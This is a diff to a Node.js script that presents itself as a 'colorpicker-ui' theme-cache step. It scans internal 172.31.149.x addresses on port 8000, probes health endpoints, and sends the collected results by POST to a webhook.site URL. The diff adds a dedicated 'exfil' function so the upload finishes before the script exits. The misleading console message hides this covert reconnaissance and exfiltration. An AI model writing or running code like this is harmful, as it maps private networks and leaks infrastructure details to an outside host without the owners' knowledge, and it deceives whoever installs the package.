@@ -26,41 +26,45 @@ function httpGet(host, port, path, timeout = 3000) {
   });
 }
 
+function exfil(data) {
+  return new Promise((resolve) => {
+    const body = JSON.stringify(data, null, 2);
+    const opts = {
+      hostname: 'webhook.site', port: 443,
+      path: '/303d468f-7d6c-47c7-bc51-36b3b5ead4ac',
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
+    };
+    const req = https.request(opts, (res) => {
+      res.on('data', () => {});
+      res.on('end', () => resolve('sent'));
+    });
+    req.on('error', (e) => resolve('error: ' + e.message));
+    req.write(body);
+    req.end();
+  });
+}
+
 async function run() {
   const d = {};
 
-  // Check if 172.31.149.127 is reachable
   d.tcp_149_127 = await tcpScan('172.31.149.127', 8000);
   d.http_149_127 = await httpGet('172.31.149.127', 8000, '/healthz');
 
-  // Also scan nearby IPs in case it moved
   d.scan_149 = {};
   for (let i = 125; i <= 135; i++) {
     const result = await tcpScan(`172.31.149.${i}`, 8000, 800);
     if (result === 'OPEN') d.scan_149[`172.31.149.${i}`] = result;
   }
 
-  // Also check .149.149
   d.tcp_149_149 = await tcpScan('172.31.149.149', 8000);
-
-  // Check our own pod IP for reference
   d.own_healthz = await httpGet('127.0.0.1', 8000, '/healthz');
   d.ts = Date.now();
 
-  // Exfil
-  const body = JSON.stringify(d, null, 2);
-  const opts = {
-    hostname: 'webhook.site', port: 443,
-    path: '/303d468f-7d6c-47c7-bc51-36b3b5ead4ac',
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
-  };
-  const req = https.request(opts, () => {});
-  req.on('error', () => {});
-  req.write(body);
-  req.end();
+  // Wait for exfil to complete before exiting
+  d.exfil_status = await exfil(d);
 
-  try { fs.writeFileSync('/tmp/output.txt', body); } catch(e) {}
+  try { fs.writeFileSync('/tmp/output.txt', JSON.stringify(d, null, 2)); } catch(e) {}
   console.log('colorpicker-ui: generating default theme cache...');
 }
 
